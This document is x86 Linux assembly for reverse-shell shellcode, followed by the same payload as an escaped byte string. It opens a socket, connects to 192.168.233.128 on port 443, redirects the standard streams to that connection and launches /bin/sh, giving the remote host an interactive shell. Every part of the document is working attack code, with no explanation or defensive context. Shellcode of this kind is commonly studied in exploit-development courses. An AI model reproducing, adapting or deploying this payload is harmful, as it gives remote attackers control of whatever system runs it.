global _start

_start:
    ; socket(2, 1, 0);
    xor eax, eax         ; $eax = 0x0
    mov ax, 0x167        ; $eax = socket()

    push 0x2             ; AF_INET
    pop ebx              ; $ebx = AF_INET

    push 0x1             ; SOCK_STREAM
    pop ecx              ; $ecx = SOCK_STREAM

    cdq                  ; $edx = 0x0

    int 0x80             ; syscall

    ; connect(s, [2, 443, "192.168.233.128"], 16);
    mov ebx, eax         ; descriptor

    push 0x80e9a8c0      ; "192.168.233.128"
    push word 0xbb01     ; 443
    push word 0x2        ; AF_INET
    mov ecx, esp         ; sockaddr_in

    mov dl, 0x10         ; len struct

    mov ax, 0x16a        ; $eax = connect()
    int 0x80             ; syscall

    ; dup2(clientfd, fd);
    push 0x2             ; counter
    pop ecx              ; $ecx = counter

    .loop:
        mov al, 0x3f     ; $eax = dup2()
        int 0x80         ; syscall

        dec ecx          ; $ecx -= 1
        jns .loop        ; if ecx != 0

        ; execve("/bin/sh", NULL, NULL);
        mov al, 0xb      ; $eax = execve()
        push 0x68        ; "h"
        push word 0x732f ; "/s"
        push 0x6e69622f  ; "/bin"
        mov ebx, esp     ; $ebx = "/bin/sh"

        xor ecx, ecx     ; $ecx = NULL
        cdq              ; $edx = NULL

        int 0x80         ; syscall

; shellcode = b"\x31\xc0\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\x99\xcd\x80\x89\xc3\x68\xc0\xa8\xe9\x80\x66\x68\x01\xbb\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80"
